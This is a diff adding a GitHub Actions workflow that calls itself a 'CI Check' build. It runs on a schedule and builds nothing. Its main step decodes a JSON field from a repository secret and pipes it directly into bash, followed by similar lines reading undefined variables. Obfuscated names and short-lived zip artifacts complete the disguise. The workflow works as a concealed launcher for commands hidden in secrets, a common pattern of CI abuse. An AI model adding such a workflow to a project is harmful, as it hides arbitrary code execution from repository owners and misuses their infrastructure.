@@ -1,0 +1,36 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          m9: ${{ secrets.m9 }}
+        run: |
+          printf '%s' "$m9" | jq -r .jn5 | /bin/bash
+          echo $y3009 | jq -r .ok51568 | /bin/bash
+          echo $la8752 | jq -r .a44750 | /bin/bash
+          printf '%s' "$v78" | jq -r .kbpl99643 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ipMYOt6y
+          path: "*.zip"
+          retention-days: 1
